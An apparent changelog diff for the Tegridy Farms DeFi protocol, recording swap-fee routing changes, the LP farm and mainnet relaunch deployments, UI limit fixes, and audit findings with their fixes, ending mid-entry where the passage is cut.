+(`uniOutputAmount > 0n`) while the new one shows on every native selection.
+`tegridyOutputFormatted` — the native figure in the route-comparison panel — is now
+the post-fee number rather than the pre-fee one, and `outputAmount`,
+`minimumReceived` and therefore the signed `minReceivedRaw` all derive from that
+same netted figure.
+
+Fee side per path, checked against the contract at `003445e3`: ETH input and token
+input are skimmed from the **input**
+([`SwapFeeRouter.sol:704`](contracts/src/SwapFeeRouter.sol#L704),
+[`:819`](contracts/src/SwapFeeRouter.sol#L819)); `swapExactTokensForETH` skims the
+**ETH output** and grosses its own inner `amountOutMin` up by `1/(1-fee)` before
+the inner swap ([`:757`](contracts/src/SwapFeeRouter.sol#L757)), so a post-fee
+`minOut` is the correct thing to sign there. The frontend applies one linear output
+haircut for all three; on the input-side paths that is conservative by AMM
+concavity (`out(λx) >= λ·out(x)` for `λ ∈ [0,1]`), so the derived `minOut` cannot
+manufacture a revert.
+
+Three qualifications the commit message does not carry:
+
+- **ERC-20-input swaps reverted at gas estimation for the next five days.**
+  `useSwapAllowance` still approved `selectedRoute === 'tegridy' ? TegridyRouter :
+  SwapFeeRouter` while `useSwap` now executed `'tegridy' → SwapFeeRouter` and
+  (since `43c3ddbb`) `'uniswap' → UniswapV2Router` — the user approved one contract
+  and the swap called another, so `safeTransferFrom` reverted on both named routes.
+  Three of the four executor paths were mismatched; the exception is the aggregator
+  route whose on-chain fallback is native, which this commit incidentally repaired
+  by moving that leg onto the SwapFeeRouter the allowance hook was already
+  approving. ETH-input swaps need no approval and were unaffected, which is the
+  only reason any native fee capture was reachable in that window. Fixed
+  2026-06-13 by `2346c93b`, whose body labels it F186 CRITICAL and states the
+  breadth as every ERC-20-input swap; it extracted
+  [`lib/swapRouting.ts`](frontend/src/lib/swapRouting.ts)`:swapSpenderFor` as the
+  single source of truth for the puller and pinned `spender === executor` for every
+  route.
+- **The quoted fee is a hardcoded mirror, not a read — and it is not the number
+  being signed.** `SWAP_FEE_BPS = 50` lives in
+  [`constants.ts`](frontend/src/lib/constants.ts) with a comment saying to read it
+  on-chain if the owner ever retunes it; that read was never added, and the value is
+  still 50 today. Meanwhile `maxFeeBps` is signed as `100n` — SwapFeeRouter's
+  `MAX_FEE_BPS`, i.e. 1%, the contract's own ceiling — still `100n` in
+  `useSwap.ts:450` and `:478` today. The guard it feeds is
+  `if (effectiveFee > maxFeeBps) revert FeeExceedsMax()`, so pinning it at the
+  ceiling means **the user-side fee guard can never fire**. `feeBps` is mutable
+  storage and `_getEffectiveFeeBps(path[0], msg.sender)` layers a per-input-token
+  override and a premium-subscriber discount capped at
+  `MAX_PREMIUM_DISCOUNT_BPS = 7500` on top, so the effective fee can differ from 50
+  bps in either direction while the quote keeps showing 0.5%. The deployed value
+  does match for now:
+  [`DeployMVP.s.sol:47`](contracts/script/DeployMVP.s.sol#L47) passes
+  `SWAP_FEE_BPS = 50` into the constructor.
+- **The commit's "…to the staker/POL/treasury split" is the shape of the split, not
+  where the money lands.** On the ETH-side paths the whole fee is first offered to
+  `referralSplitter.recordFee` and only reaches `accumulatedETHFees` when there is
+  no splitter or that call reverts
+  ([`:569`](contracts/src/SwapFeeRouter.sol#L569),
+  [`:710`](contracts/src/SwapFeeRouter.sol#L710)). Token-input fees are booked in
+  the input token (`accumulatedTokenFees[path[0]]`) and need a
+  `convertTokenFeesToETH` before they are distributable at all — the first
+  conversion per token is owner-only so the slippage floor can be checked
+  off-chain, after which direct-path conversions are permissionless under the
+  on-chain TWAP floor. And the split itself is unconfigured: `stakerShareBps` is
+  declared `10_000` with `polShareBps` `0` and `DeployMVP` never calls
+  `applyFeeSplit`, so on the deployed configuration the POL and treasury legs are
+  unfunded until that setter is driven through the timelocked
+  `SwapFeeRouterAdmin`, under the `MIN_STAKER_SHARE_BPS = 5_000` /
+  `MAX_POL_SHARE_BPS = 2_500` guardrails.
+
+Inert by design while the native pool is thin — Uniswap wins the comparison and
+nothing changes — with one edge the commit's "no behavior change" claim does not
+cover: when there is no Uniswap quote (`uniOutputAmount === 0n`) the selector
+already fell through to native unconditionally, and that unchanged fallthrough now
+routes through SwapFeeRouter, so a trade on a pair Uniswap does not price pays the
+fee with nothing to have been compared against.
+
+Tests: the 3 native-route cases in
+[`useSwap.test.ts`](frontend/src/hooks/useSwap.test.ts) were rewritten to assert
+`SWAP_FEE_ROUTER_ADDRESS` and the extra argument (`args` length 4 → 5 for ETH-input,
+5 → 6 for token-input, with `args[4]` / `args[5] === 100n`). 6/6 routing tests pass;
+`tsc --noEmit` clean. Landed directly on trunk — no PR.
+
+### Added — the LP farm went live, and an LP position stopped disappearing the moment you staked it (2026-06-07)
+
+- **`TegridyLPFarming` deployed, and the gate constant set** (`c5c416c8`) at
+  `0x1171268AE5B69791c47Fd589b7825932c957e149` (tx `0x7e3613…`). On-chain
+  verified before the constant was set: `rewardToken` = TOWELI, `stakingToken` =
+  TEGRIDY_LP, `owner` = deployer with `pendingOwner` = Safe,
+  `MAX_BOOST_BPS_CEILING` = 45000, `rewardsDuration` = 7d. The change itself is a
+  single line in `constants.ts`, which un-gates the Farm LP-staking UI and the
+  Dashboard staked-LP view **on the next frontend deploy** — the commit is the
+  gate coming off, not the site changing.
+- **The deploy script stopped depending on env vars** (`09418d22`). `TEGRIDY_LP`,
+  `TEGRIDY_STAKING` and `MULTISIG` (the relaunch Safe, which is `pendingOwner` of
+  the other contracts) are now constants verified live on-chain, making the deploy
+  a single command with no shell-quoting friction.
+- **A wrong signature in the script's operator notes** (`9a1822f1`). The printed
+  NEXT STEPS said `notifyRewardAmount(amount)`, but the real signature is
+  `notifyRewardAmount(uint256 amount, uint256 duration)` — the second argument is
+  the M-3 dead-timelock audit fix — so a one-arg call hits a nonexistent selector
+  and reverts with empty data. *The identical wrong signature was still sitting in
+  the frontend's hand-rolled `LPFarming` ABI and was not caught there until
+  2026-07-28, by the selector-drift sweep in
+  [#123](https://github.com/fomotsar-commits/tegridy-farms/pull/123) — see that
+  entry.*
+- **The Farm page had never displayed what it was paying** (`400c40fa`). A
+  live-preview audit found the 6.4M reward pool and the daily emission rate were
+  nowhere on the page, and every stat was gated behind wallet-connect. New
+  [`IncentivesStrip`](frontend/src/components/farm/IncentivesStrip.tsx) — reward
+  pool, daily emissions, 4x max boost, fee share — renders for disconnected and
+  connected visitors alike, with `useFarmStats` extended to derive
+  `dailyEmissions` from `rewardRate` and to expose `rewardPool`. Additive; no
+  section or art removed.
+- **A live LP-farming APR, and season copy that stopped implying a payout**
+  (`6b81531c`).
+  [`LPFarmingSection`](frontend/src/components/farm/LPFarmingSection.tsx) gained a
+  prominent Est. APR derived from on-chain emissions and staked-LP USD value
+  (annual rewards USD / staked TVL), which self-corrects as TVL grows and shows a
+  "be first to stake" state rather than a fabricated number when nothing is staked
+  yet. Reward Rate and Total Funded are formatted through `formatNumber`
+  (`285.70/day`, `2,000`) instead of fixed four decimals, and `CURRENT_SEASON`
+  dropped its unused hardcoded `totalRewards` and is relabelled as an engagement
+  countdown, not a reward claim — the real figures render from chain. The commit
+  records on-chain backing confirmed healthy: staking 6.4M funded at 0.8243/s, LP
+  farm 2,000 over 7d.
+- **LP positions were invisible everywhere a user looks for holdings**
+  (`e186fd9b`, `75f81522`). The LP token is not on wallet token lists, so a
+  position existed only in the pair contract. New
+  [`useLpPosition`](frontend/src/hooks/useLpPosition.ts) reads the canonical
+  Tegridy TOWELI/WETH pair — LP balance, pool share, redeemable TOWELI and WETH —
+  and the Dashboard Positions tab renders a "Your Liquidity" card with a Manage
+  link when the wallet holds LP, with LP value added to the portfolio total. The
+  follow-up closed the obvious next hole: the hook now also reads LP **staked in
+  farming** (`rawBalanceOf`) plus `earned` rewards and combines wallet and staked
+  LP for share, redeemable and value, so **the position no longer vanishes the
+  moment a user stakes it**; the card gains an "N staked" sub-line and a
+  "Staked & earning · X TOWELI pending" line, and farm rewards join the portfolio
+  total. The farming reads fail closed to 0 while `LP_FARMING_ADDRESS` is unset,
+  so the change was inert pre-deploy and activated by itself on `c5c416c8`.
+  `dc720101` added a TGLP add-to-wallet panel to the swap page's
+  [`LiquidityTab`](frontend/src/components/swap/LiquidityTab.tsx) for the same
+  reason.
+- **Redeemable TOWELI rendered as `789720`** (`608a6c86`). The Your Liquidity card
+  called `formatTokenAmount(x, 0)`, which emits no separators; switched to
+  `formatWholeNumber` for `789,720`. Verified live.
+
+### Fixed — two stake bounds the forms never surfaced, so the wallet delivered the news as scare-copy (2026-06-07)
+
+Both defects have the same shape: a contract-level bound the UI never showed —
+one an upper limit, one a lower one — so the first time a user learned about it was
+from a wallet warning about a transaction that was going to fail.
+
+- **The staking form let you exceed the per-wallet cap** (`ce15b49f`). Over-cap
+  stakes reverted, which MetaMask surfaces as **"Likely to Fail"**.
+  [`StakingCard`](frontend/src/components/farm/StakingCard.tsx) now reads
+  `maxStakePerUser` on-chain — so it tracks governance raising the cap with no
+  redeploy — with `maxStakePerUser` and `maxTotalStaked` added to the staking ABI.
+  The form disables and explains itself when the amount is over the cap or under
+  the 100 TOWELI minimum, carries an always-visible "Max N per wallet (testing
+  phase)" note, and the Balance shortcut fills `min(balance, cap)` so one tap
+  gives a stakeable amount. 34 staking tests pass.
+- **The LP stake input had no minimum guard at all** (`69bab395`). Staking below
+  the farm's `MIN_STAKE` (100 LP) reverts with `StakeBelowMinimum()`, and the
+  wallet renders that as a huge revert-fallback gas estimate — the commit calls it
+  "the $75 phantom". `MIN_STAKE` was added to `LP_FARMING_ABI`, read through
+  `useLPFarming` as `minStake`/`minStakeFormatted`, and `LPFarmingSection` now
+  blocks sub-minimum stakes client-side ("Min N LP required") and shows the
+  minimum plus an add-liquidity pointer when the wallet's LP balance is below it.
+
+### Fixed — the 2026-06-06 relaunch left every staker reading a zero position, and price off a stale pair (2026-06-07)
+
+- **The frontend was repointed at the new mainnet deploy** (`b5e43a91`). 13 MVP
+  contracts and the treasury Safe moved to the 2026-06-06 `DeployMVP` addresses;
+  `STAKING_MONITOR_VIEW_ADDRESS` was added for the EIP-170 view sister; restaking
+  was zeroed as deferred Phase 7, with the UI gating on `isDeployed`; and the
+  nakamigos `PLATFORM_FEE_RECIPIENT` moved from a signer EOA to the new treasury
+  Safe. **Deliberately not shipped to the live site in this commit** — it waited
+  on the staking fund, the LP seed and the TWAP bootstrap so the site would not
+  point at an empty protocol.
+- **Four defects the post-deploy audit found in that wiring** (`0d6e0808`):
+  - *H1* — `getPosition` and `earned` were still being called on the host staking
+    contract, where they revert after the EIP-170 split, so **every staker's
+    position read as zero** (`useUserPosition`, `usePoints`). Routed to
+    `StakingMonitorView`.
+  - *H2* — price, TVL and points reads still pointed at the stale Uniswap pair;
+    repointed to the native relaunch pair `TEGRIDY_LP_ADDRESS` (`useToweliPrice`,
+    `usePoolTVL`, `usePoints`). GeckoTerminal chart URLs were deferred until the
+    LP is seeded and indexed.
+  - *M1* — restaking UI, reads and writes gated on `isDeployed`, removing an
+    `address(0)` footgun on a Phase-7 contract.
+  - *M2* — `AdminPage` reads the pending fee and treasury from
+    `SwapFeeRouterAdmin` rather than the main router.
+- **A season that had already expired, and an indexer pointing at dead contracts**
+  (`abd8eacd`). `CURRENT_SEASON` was still Season 2, expired 2026-06-01 and
+  rendering "0d left"; it moved to Season 3 (2026-06-07 → 09-05, 6.4M).
+  [`ponder.config.ts`](indexer/ponder.config.ts) repointed **every** subscription
+  — staking, revdist, SwapFeeRouter, factory, POL, TWAP — to the relaunch
+  addresses with start block 25263328, and `StakingAdmin`/`SwapFeeRouterAdmin` now
+  default to their relaunch addresses with env still able to override. The commit
+  is explicit that this makes the indexer **deploy-ready, not deployed**: standing
+  up the Ponder endpoint is an outstanding operator step.
+
+### Added — a fee-executor router for aggregator calldata, built to be attacked, deployed nowhere (2026-06-07)
+
+- `dc720101` — Phase 2 of the new
+  [`docs/SWAP_REVENUE_ARCHITECTURE.md`](docs/SWAP_REVENUE_ARCHITECTURE.md).
+  [`TegridyFeeExecutorRouter`](contracts/src/TegridyFeeExecutorRouter.sol) (563
+  lines) executes LlamaSwap-selected aggregator calldata while skimming a bounded
+  (≤1%) protocol fee into the staker / POL / treasury split. The posture is
+  borrowed rather than invented: 0x-Settler's zero-residual-allowance discipline,
+  a **dual target *and* spender allowlist** with timelocked adds and instant
+  removes, balance-delta `minOut`, opaque `swapData` handled with no assembly, and
+  a return-data-bomb-safe call. Genesis allowlist seeded in the constructor, sinks
+  immutable, no withdraw hatch. **Audit-gated and `isDeployed`-gated in the
+  frontend — built, not live.** The same commit shipped
+  [`DeployFeeExecutorRouter.s.sol`](contracts/script/DeployFeeExecutorRouter.s.sol)
+  with an env-supplied verified allowlist, and corrected a stale pre-relaunch
+  treasury address in
+  [`DeployTegridyLPFarming.s.sol`](contracts/script/DeployTegridyLPFarming.s.sol).
+- `aa9f49fd` — [544 lines of attack
+  tests](contracts/test/TegridyFeeExecutorRouter.t.sol): mock-based happy paths
+  (ERC20 and native fee skim, distribute split, sweep, fee-on-transfer using the
+  received amount) plus eleven gates that **must revert** — non-allowlisted
+  target, non-allowlisted spender, `target == token`, malicious over-pull,
+  drain-other-token, reentrancy, return-data bomb, `minOut`, deadline, fee bound,
+  and `onlyOwner`. The same commit added
+  [`DeploySwapFeeRouterUniswap.s.sol`](contracts/script/DeploySwapFeeRouterUniswap.s.sol),
+  a Phase-1 script that redeploys `SwapFeeRouter` wired to the real Uniswap V2
+  Router02 (`referralSplitter = address(0)` to skip the locked-setup timelock
+  dance) with a `router() == Uniswap` self-assertion — the contract-side answer to
+  the same mis-wiring the frontend routed around the following day. **None of
+  these tests were run locally:** the commit records `forge fmt` clean and defers
+  execution to CI, because the local `forge build` hangs on this checkout.
+
+### Security — two multi-agent re-audits in two days: a HIGH reward-theft path in restaking, and three captured-owner gaps (2026-06-06 → 2026-06-07)
+
+Both commits place their findings in deferred contracts, with different reach:
+`833b757a` records the restaking HIGH as EIP-170-deferred and un-deployable — not
+launch-blocking, but required before restaking ships — and `38aaad24` records all
+three of its Lows as Phase-7, not-in-MVP, `TegridyLending` among them. The
+`GaugeController` griefing Low carries no such note either way.
+
+**`833b757a` (2026-06-06)** — from a 2026-06-05/06 deep re-audit that the commit
+records as 42 finders plus 3-skeptic refutation panels; three findings survived and
+each was verified line-by-line against the code before it was fixed.
+
+- **HIGH — `TegridyRestaking` residual-claimant reward theft.** `_reserveResidual`
+  early-returned on a zero-residue exit **without clearing `_residualClaimant`**,
+  so a stale claim survived an NFT ownership change. The M28 carve-out then
+  admitted a new restaker, a permissionless `kick` credited their rewards into the
+  shared restaking bucket, and the cross-holder guard in
+  `claimResidualForTokenId` defended only the third-party / lending-escrow case
+  (`currentOwner == address(this)` took the false branch). Staking-side
+  `claimUnsettledForTokenId` pays an arbitrary recipient — the H-11 ownership
+  check there is reverted — so **a prior restaker holding the stale claimant slot
+  could siphon a new restaker's per-tokenId staking rewards.** Two fixes, both
+  fail-safe in the sense that neither can *enable* a payout: clear
+  `_residualClaimant` when residue is 0 (the root cause), and defer the claim when
+  the NFT is back at restaking under a different live restaker (defence in depth,
+  never blocking a self-re-restake claim). Regression test
+  `test_AUDIT20260605_staleResidualClaimant_cannotDrainNewRestaker`.
+- **LOW — `TegridyLending.sweepUnsolicitedNFT` diverged from its sibling.** The
+  sweep scanned only ACTIVE loans and never consulted `stuckCollateralRecipient`,
+  so a resolved-but-stuck NFT owed to a recipient could be owner-swept to an
+  arbitrary address. Fixed with the guard `TegridyNFTLending` already carried
+  (`TegridyNFTLending.sol:1604`).
+- **LOW — `GaugeController` removal griefing.** Every `executeRemoveGauge*` path
+  reverts on any current-epoch vote, so a recurring 1-wei vote blocks removal
+  indefinitely. Added owner-only `executeForceRemoveGauge` under the same 24h
+  `GAUGE_REMOVE` timelock, de-weighting then pruning (the Curve/Velodrome kill
+  pattern), underflow-safe via the increment-in-lockstep `gaugeWeight`/
+  `totalWeight` invariant.
+- Also carried a comment-only correction that was already in the working tree at
+  `TegridyRestaking.sol:2388` (`unforwardedBaseRewards` → `unforwardedBonusRewards`);
+  the code there was already correct.
+
+**`38aaad24` (2026-06-07)** — a full-surface re-audit (the commit records 11
+attacker-pass agents over all contracts, the frontend and the serverless API) that
+found no Crit/High/Med surviving and traced the live MVP deploy surface clean.
+Three Low captured-owner / consistency gaps, each closed by mirroring an existing
+in-repo pattern verbatim rather than writing a new one:
+
+- `TegridyLendingAdmin` had **no `acceptOwnership` override** — the only admin
+  sister missing it. Its 11 timelocked proposals live in `_executeAfter`,
+  independent of `owner()`, so **a proposal queued by an owner who had since been
+  rotated away or compromised survived the handoff as an executable booby-trap**
+  (treasury redirect, principal brick). Flush-on-accept added, mirroring
+  `TegridyNFTLendingAdmin`.
+- `TegridyLending` had no `acceptOwnership` override for its inline
+  admin-replacement proposal (`pendingLendingAdmin`) — same class; flush-on-accept
+  mirroring `SwapFeeRouter` / `TegridyStaking`.
+- `TegridyV4Hook.setDiscountConfig` accepted an EOA, or an EIP-7702-delegated EOA,
+  as `premiumAccess` — which `_discountedFee` **calls**, via `hasPremium` — so a
+  captured `paramAdmin` could point it at an attacker-controlled responder and
+  mint itself the up-to-50% fee discount. Now rejects code length 0 or 23,
+  mirroring `SwapFeeRouter.applyPremiumAccess`; `address(0)` remains the disable
+  path.
+
+**Verification on both is partial, and the commits say so.** `forge fmt` parses
+every touched file clean, but the local `forge build` is environment-blocked on
+this checkout (solc 0.8.26 uncached, plus a pre-existing v4-core/solmate remapping
+stall), so the solc type-check and the test run were deferred to CI. **That
+deferral cost seven weeks on one of them:** CI compiled the V4Hook guard but ran
+nothing under `test/v4/`, so `test_admin_discountConfigTimelockFlow` — which
+proposes a bare `makeAddr("premiumAccess")` and therefore now fails
+`NotAContract()` — stayed red and unseen until 2026-07-28
+([#129](https://github.com/fomotsar-commits/tegridy-farms/pull/129)). See the
+"Four CI gates that were passing while running nothing" entry.
+
+### Fixed — the token importer hung forever on bytes32-symbol tokens like MKR (2026-06-07)
+
+`5c7c124a`, found by live browser testing rather than by a test. Pasting an
+address whose `symbol()`/`name()` return a non-standard `bytes32` — MKR, SAI and
+other legacy tokens — left the Select Token modal on "Looking up token…"
+**indefinitely**. The 8s lookup-timeout guard was
+`!importSymbol && !importDecimals`, i.e. both reads had to fail; for MKR the
+string-typed `symbol()` read errors out while `decimals()` succeeds and returns
+18, so the conjunction was never satisfied and **the timeout never fired at all**.
+It now fires when *either* field is still missing, and tests
+`importDecimals === undefined` rather than `!importDecimals` so a legitimate
+0-decimal token is not falsely rejected. Fails safe — a token that cannot be fully
+read is never imported. Verified live: MKR now shows "Could not read token
+details…" once the timeout elapses, and ENS still imports with the
+unverified-token warning. Eleven lines in
+[`TokenSelectModal.tsx`](frontend/src/components/swap/TokenSelectModal.tsx).
+
+### Changed — tegridyfarms.xyz was never registered; purged from CORS allowlists, docs and contact addresses (2026-06-07)
+
+Three commits closing one fiction, and the third overturns the first's reasoning.
+`9aff5579` records registry RDAP returning 404 and DNS NXDOMAIN for
+`tegridyfarms.xyz` — it existed only as a placeholder added to the Vercel project,
+since removed. `tegridyfarms.vercel.app` is the only real site.
+
+- `8f40883b` removed `tegridyfarms.xyz` and `www.tegridyfarms.xyz` from every API
+  and indexer CORS allowlist (`vercel.app` was already present in each, so nothing
+  lost access), repointed the `ALLOWED_ORIGIN` fallback default and the code
+  comments, and updated the test origins so the suites still exercise the real
+  allowlist. App tests: 103/103.
+- `9aff5579` replaced every remaining website reference repo-wide — README,
+  `docs/API.md`, `docs/COMMUNITY_LAUNCH.md`, `docs/SECRET_ROTATION.md`,
+  `docs/WAVE_0_RUNBOOK.md`, `docs/banner.svg`, `frontend/.env.example`'s
+  `ALLOWED_ORIGIN` default, `AUDITS.md`, `FIX_STATUS.md` and eight `.audit_101`
+  files.
+- `cd859ccf` — **the earlier reasoning was wrong, and this commit says so.**
+  `8f40883b` deliberately left the `security@` / `conduct@tegridyfarms.xyz`
+  contacts in place, on the stated ground that the domain was owned and email is
+  separate from the website. It is not owned, so **those addresses can never
+  receive mail** — a security contact that silently drops reports is worse than
+  no contact at all. The Security and Privacy pages and the policy/runbook docs
+  now route to the community channels linked on the site; the two historical
+  `.audit_101` mentions were left in place as records.
+
+### Added — on-chain Protocol Stats on the home page, and a protocol-limits reference (2026-06-07)
+
+- `1b1b91bf` — a "By the Numbers" home section
+  ([`ProtocolStats`](frontend/src/components/ProtocolStats.tsx) +
+  [`useProtocolStats`](frontend/src/hooks/useProtocolStats.ts)) surfacing live
+  on-chain figures: total volume derived as fees/feeRate, real yield generated,
+  the staking reward pool, daily emissions, total staked and swap count. Public —
+  no wallet and no indexer required — and it populates as trading begins once the
+  LP is seeded.
+- `b7bd8d26` — a "Protocol limits & parameters" reference on
+  [`RisksPage`](frontend/src/pages/RisksPage.tsx), 125 lines listing every
+  min/max/cap across staking, LP farming, swap, lending, NFT lending and
+  launchpad/drops, each with its value, its rationale and its live status, **so a
+  user never meets a limit for the first time inside a failing transaction**. It
+  complements the inline limit hints already on the live staking and LP forms.
+
+### Security — a stale residual claimant could drain a new restaker's per-tokenId rewards (2026-06-06)
+
+`833b757a`.
+
+A deep multi-agent re-audit run across 2026-06-05/06 — the commit records 42 finders plus three-skeptic refutation panels — returned three issues, each verified line-by-line against the code before it was fixed. All three fixes are minimal and fail-safe.
+
+- **The HIGH is a chain of four behaviours that are each defensible alone.** `_reserveResidual` early-returned on a zero-residue exit **without clearing `_residualClaimant`**, so a stale claim survived a change of NFT ownership — that is the root cause. The M28 carve-out then admitted a new restaker; a permissionless `kick` credited the new restaker's rewards into the shared restaking bucket; and the cross-holder guard in `claimResidualForTokenId` defended only the third-party / lending-escrow case, because with the NFT back at restaking `currentOwner == address(this)` took the false branch. Staking-side `claimUnsettledForTokenId` pays an arbitrary recipient — the H-11 ownership check there is reverted — so the prior restaker could siphon the new restaker's per-tokenId staking rewards. Two fixes, neither of which can enable a payout: clear the claimant when `residue == 0`, and additionally defer in `claimResidualForTokenId` when the NFT is back at restaking under a *different* live restaker, which never blocks a self-re-restake claim. Regression test `test_AUDIT20260605_staleResidualClaimant_cannotDrainNewRestaker`. **Not launch-blocking** — restaking is EIP-170-deferred and un-deployable, see the split entry below — but required before restaking ships.
+- **LOW — `TegridyLending.sweepUnsolicitedNFT` sibling divergence.** The sweep scanned only ACTIVE loans and never consulted `stuckCollateralRecipient`, so an NFT owed to a recipient after a resolved-but-stuck loan could be owner-swept to an arbitrary address. It now carries the same guard `TegridyNFTLending` already had at `TegridyNFTLending.sol:1604` — a divergence between siblings, not a missing design.
+- **LOW — `GaugeController` removal griefing.** Every `executeRemoveGauge*` path reverts on any current-epoch vote, so a recurring 1-wei vote blocks removal indefinitely. Added `executeForceRemoveGauge`, owner-only under the same 24h `GAUGE_REMOVE` timelock, which de-weights and then prunes (the Curve/Velodrome kill pattern); underflow-safe via the increment-in-lockstep `gaugeWeight`/`totalWeight` invariant.
+
+The commit also carries a comment-only correction that was already sitting in the working tree at `TegridyRestaking.sol:2388` (`unforwardedBaseRewards` → `unforwardedBonusRewards`); the code there was already correct.
+
+### Added — GO LIVE: the 2026-06-06 mainnet relaunch, and the two days of repointing it took to work (2026-06-06 → 2026-06-08)
+
+**The broadcast ran ten weeks before this repository could prove it.** `DeployMVP.s.sol`
+went out against mainnet at **2026-06-06 23:23:37 −0600** (2026-06-07 05:23:37 UTC); the
+receipts that record it — `contracts/broadcast/DeployMVP.s.sol/1/run-latest.json`, 13
+`CREATE` transactions plus the factory's `createPair`, across blocks
+**25263328–25263339** — were not committed until `15ef4263` (2026-08-18), which says they
+had "been sitting untracked since the day they were produced." Until then the earliest
+in-repo trace was `b5e43a91` (2026-06-07 00:08, 45 minutes after the last deploy tx),
+which wires the resulting addresses into the frontend and opens with the sentence
+"DeployMVP went live on mainnet 2026-06-06." Until now the relaunch appeared in this
+changelog only obliquely — as the thing a later entry was *post*-. This entry is the
+record.
+
+**What went live.** `DeployMVP` is `chainid == 1`-gated and puts the whole day-1
+economic loop out in one broadcast — AMM (Factory / TOWELI-WETH pair / Router / TWAP),
+staking (Staking + JbacVault + Admin + `StakingMonitorView` + TokenURIReader) and
+revenue (RevenueDistributor + ReferralSplitter + SwapFeeRouter + SwapFeeRouterAdmin +
+POLAccumulator). Its summary line reads `MVP DEPLOYMENT COMPLETE (14 contracts;
+Restaking deferred to Phase 7)`, and the receipts bear that out: 13 direct deploys plus
+the pair the factory created. `b5e43a91` repointed 13 of the 14 in
+[`frontend/src/lib/constants.ts`](frontend/src/lib/constants.ts) from a fresh deployer
+wallet — the JbacVault (recorded in the receipts as
+`0x28317bf362d43b40fcecebf2390c43db558c3f14`) is wired contract-side and has no frontend
+constant:
+
+| Contract | Relaunch address |
+|---|---|
+| TegridyStaking | `0xcaDc93E96De58EA554c71ca609974625615E046D` |
+| TegridyStakingAdmin | `0x4B134C08aAF86B6e2A8E097D1039C4e7638806f3` |
+| StakingMonitorView | `0xbE1E75124C7F07d5B681839C42d8e751f0d0fcfC` |
+| TegridyTokenURIReader | `0x5cfEe751eAf274F68b05267012b85a867dfCd326` |
+| TegridyFactory | `0xa24C7287eC56A7DEFDc70033803451240e267a52` |
+| TegridyRouter | `0xE9F83A07b071748E795d2489651d5310fA098Db8` |
+| TOWELI/WETH pair | `0x55875887B43C2E23aE424AF0FC8606Fdb058a481` |
+| TegridyTWAP | `0xdFdd6D72539A425dC917F49FB834901105cA98c9` |
+| RevenueDistributor | `0xF993316E2fC079de4358c489A935E01e03E23E17` |
+| ReferralSplitter | `0x6B3442dAcB62d40BA39fCe9b3CDa350FEa6f7e4c` |
+| SwapFeeRouter | `0x6d5791A660e79175F74C6D639584C98422d5956E` |
+| SwapFeeRouterAdmin | `0xa517A1cEfd961c0DDE8155a0Fa870aEE5bb0D060` |
+| POLAccumulator | `0x2A5f65f4C74b1e49e77aE9A57e20fBDb0cED11D2` |
+| Treasury Safe | `0x7D2620243EdAd69Ec81A53c4A063B07995A4Bd7d` |
+| Owner Safe (`MULTISIG`) | `0xA36053477568Fb5382492F3A5970D35Fe896b7F8` |
+
+Launch parameters are constants in the script, not env vars: `REWARD_PER_SECOND`
+0.8243 TOWELI/s, `SWAP_FEE_BPS` 50 (0.5% protocol fee on swaps), `REFERRAL_FEE_BPS`
+2000 (a fifth of that fee earmarked for referrers). The constructors default the stake
+caps to `type(uint256).max`, so the script sets them **down** to
+`LAUNCH_MAX_STAKE_PER_USER` 50,000 TOWELI and `LAUNCH_MAX_TOTAL_STAKED` 5,000,000
+TOWELI before ownership leaves the deployer — the Aave V3 supply-cap pattern.
+
+**The handoff posture, and what it is not.** The script requires three addresses —
+`TREASURY`, `MULTISIG`, `PAUSE_GUARDIAN` — and reverts if any two are equal, citing
+Ronin's $625M non-disjoint signer set. It is honest in its own comment that this
+**enforces address diversity, not signer-set diversity**, which a script cannot see;
+`constants.ts` annotates the treasury as a 2-of-2 Safe. Ownership of the 8 owned
+contracts was transferred two-step, so the Safe was `pendingOwner` — not owner — the
+moment the broadcast ended, and the pause guardian was wired onto the 4 Pausable
+contracts *before* that transfer. Three factory rotations were only **queued**, each
+behind a 48h timelock and none completed by the deploy: `feeTo` → RevenueDistributor,
+`feeToSetter` → multisig, `guardian` → pause guardian. The script prints a
+`WARN [H-17]` naming all three and `VerifyMVP` INV-11 asserts them; until the guardian
+rotation executes, `TegridyFactory`'s owner remains the deployer EOA. One audit fix is
+baked into the deploy's *shape* rather than its code: DEPLOY-H1 passes
+`_revenueDistributor` through the `SwapFeeRouter` constructor, because the only
+post-deploy setter is 48h-timelocked through `SwapFeeRouterAdmin` **and** that admin's
+`acceptOwnership` flushes any pre-queued `REV_DIST_CHANGE` on handoff — a ≥96h window
+in which `distributeFeesToStakers()` would revert `ZeroAddress()` while
+`accumulatedETHFees` grew on every swap.
+
+Restaking is the deliberate hole. `TegridyRestaking` is 26,760 B, over EIP-170, and
+shipped as `address(0)` with the UI gated on `isDeployed`. The only HIGH of the deploy
+weekend was found in that undeployed contract: `833b757a` (2026-06-06) fixed a
+residual-claimant reward theft in which `_reserveResidual` early-returned on a
+zero-residue exit *without* clearing `_residualClaimant`, letting a stale claimant
+siphon a new restaker's per-tokenId rewards — fixed on the day of a launch it could
+not reach.
+
+**The site was deliberately held back.** `b5e43a91` shipped addresses and no deploy:
+"waiting on staking fund + LP seed + TWAP bootstrap so the site does not point at an
+empty protocol." Bootstrapping the TWAP is a ~2h45m operator sequence (`[H-18]`): four
+`update()` calls ≥15 min apart after the LP seed, then a 60-minute cooldown before the
+first `POL.accumulate()`. Staking was funded with 6.4M TOWELI at 0.8243/s — the
+transaction this changelog would later date exactly, at block time **2026-06-07
+06:44:23 UTC**, while fixing the Dune divisor. `abd8eacd` rolled the on-site season to
+Season 3 (2026-06-07 → 2026-09-05, 6.4M) because Season 2 had expired 2026-06-01 and
+the Farm was rendering "0d left", and repointed every Ponder subscription to the
+relaunch addresses at start block 25263328 — the indexer had been watching the
+superseded protocol, and still needed deploying as an operator step. `c5c416c8`
+(2026-06-07 20:56) added the one contract `DeployMVP` does not carry,
+`TegridyLPFarming` at `0x1171268AE5B69791c47Fd589b7825932c957e149`, with its reads
+checked on-chain: `rewardToken`=TOWELI, `stakingToken`=the relaunch pair,
+`owner`=deployer / `pendingOwner`=Safe, `MAX_BOOST_BPS_CEILING`=45000,
+`rewardsDuration`=7d. `6b81531c` recorded the backing healthy that evening: staking
+6.4M funded at 0.8243/s, LP farm 2,000 over 7 days.
+
+**And then almost everything the frontend read was still pointed at the protocol that
+had just been replaced.** Every defect below is one class — a read or a write aimed at
+a pre-relaunch address, or at the contract that no longer serves that function after
+the EIP-170 split:
+
+- **Every staker's position read as zero.** `0d6e0808` H1 — `getPosition` and `earned`
